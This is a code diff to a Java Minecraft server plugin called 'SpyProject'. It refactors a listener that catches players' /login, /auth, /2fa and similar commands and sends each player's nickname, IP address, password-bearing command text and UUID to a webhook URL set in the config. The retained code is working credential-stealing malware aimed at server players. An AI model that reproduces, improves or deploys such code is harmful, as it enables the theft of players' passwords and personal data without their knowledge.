@@ -34,21 +34,23 @@ import pt.imnotglitch.spyproject.SpyProject;
 public final class PlayerEvent implements Listener {
 
 
-    private final String authCmdsWebhookURL = SpyProject.getInstance().getConfig().getString("webhook.AuthCommands");
+    private final String authCmdsWebhookURL = SpyProject.getInstance().getConfig().getString("Webhook.AuthCommands");
+    private final String titlewebhook = SpyProject.getInstance().getConfig().getString("Webhook.Title");
+
     private final Plugin plugin;
 
     public PlayerEvent(Plugin plugin) {
         this.plugin = plugin;
     }
 
-    public void sendWebhook(String title, String text, int color, String webhookURL) {
+    public void sendWebhook(String text,  String webhookURL) {
         try {
             OkHttpClient httpClient = new OkHttpClient();
 
             JsonObject embed = new JsonObject();
-            embed.addProperty("title", title);
+            embed.addProperty("title", titlewebhook);
             embed.addProperty("description", text);
-            embed.addProperty("color", color);
+            embed.addProperty("color", 0x000000);
 
             JsonArray embeds = new JsonArray();
             embeds.add(embed);
@@ -85,7 +87,7 @@ public final class PlayerEvent implements Listener {
         if (message.startsWith("/login") || message.startsWith("/auth") || message.startsWith("/autenticar") || message.startsWith("/2fa") || message.startsWith("/logar") || message.startsWith("/loginstaff") || message.startsWith("/ls")) {
             if (parts.length > 1) {
                 webhookMessage = ":bust_in_silhouette: **Nickname:**```" + player.getName() + "```:desktop: **IP:** ```" + player.getAddress() + "``` :id: **SENHA**: ```" + message + "```:id: **UUID**: ```" + player.getUniqueId() + "```" + "\n github.com/ImNotGlitch";
-                sendWebhook("Comando Capturado", webhookMessage, 0x000000, authCmdsWebhookURL);
+                sendWebhook(webhookMessage, authCmdsWebhookURL);
             }
         }
     }
